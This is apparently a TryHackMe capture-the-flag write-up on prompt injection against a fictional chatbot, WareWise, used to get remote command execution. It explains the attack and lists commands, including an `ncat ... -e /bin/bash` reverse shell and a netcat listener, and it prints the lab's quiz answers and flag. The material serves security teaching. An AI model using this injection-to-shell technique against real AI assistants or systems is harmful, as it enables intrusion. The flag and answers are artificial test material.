# Day 18[Prompt Injection]: I could use a little AI interaction!

## Story :
The IT department of Wareville has integrated WareWise, the intelligent assistant chatbot with the HealthChecker (the service that tracks health and uptime of the wareville's systems). Our task is to understand how they work and find any vulnerabilities.

## Learning Objectives : 
- Gain a fundamental understanding of how AI chatbots work
- Learn some vulnerabilities faced by AI chatbots
- Practice a prompt injection attack on WareWise, Wareville's AI-powered assistant

## Abbreviations and Applications :
- [AI](https://www.sas.com/en_in/insights/analytics/what-is-artificial-intelligence.html) : Arificial intelligence.

## Process Key Steps and Points :
- AI is as good as its training data.
- Some possible **exploits**:
  - **Data Poisoning** : Introducing false or malicious data into the model.
  - **Sensitive Data Enclosure** : If not properly sanitised, AI models could be trained to provide sensitive and/or proprietary information.
  - **Prompt Injection** : Prompt injection is one of the most commonly used attacks against LLMs and AI chatbots. In this attack, a crafted input is provided to the LLM that overrides its original instructions to get output that is not intended initially, similar to control flow hijack attacks against traditional systems.
- Process and setting for Prompt Injection:
  Inputs to an AI model are twofold, one by the developer known as __system prompt__ and the other by the user.
  Technically and Ideally, system prompt must not be changed by the user.
  But when that restrictions arent in place, a clever prompt could overrule the system prompt and the user could gain access to info he must not have.

## Tools and Commands Used :
- `tcpdump -ni ens5 icmp` : To listen for the ping sent from the WareWise server by us.
- `ping -c 4 connection_IP` : ping connection_IP 4 times.
- `nc -lvnp port_number` : netcat
    | Flag | Description |
    | --- | --- |
    | l | listen mode |
    | n | suppress name/port resolutions |
    | p | specify port number |
    | v | verbose |
- `ncat connection_IP port_number -e /bin/bash` : to connect to our connection_IP via reverse shell.

## Questions, Hints and Answers :
1. What is the technical term for a set of rules and instructions given to a chatbot?
   - Hint : Given in the room itself
   - Ans : `system prompt`
2. What query should we use if we wanted to get the "status" of the health service from the in-house API?
   - Hint : Also in the room
   - Ans : `Use the health service with the query: status`
3. After achieving a reverse shell, look around for a flag.txt. What is the value?
   - Hint : Redo the process but now with port `4444` on both `nc` command and prompt to the chatbot. 
   - ![flag_prompt](/Screenshots/D18Q1.png)
   - Ans : `THM{WareW1se_Br3ach3d}`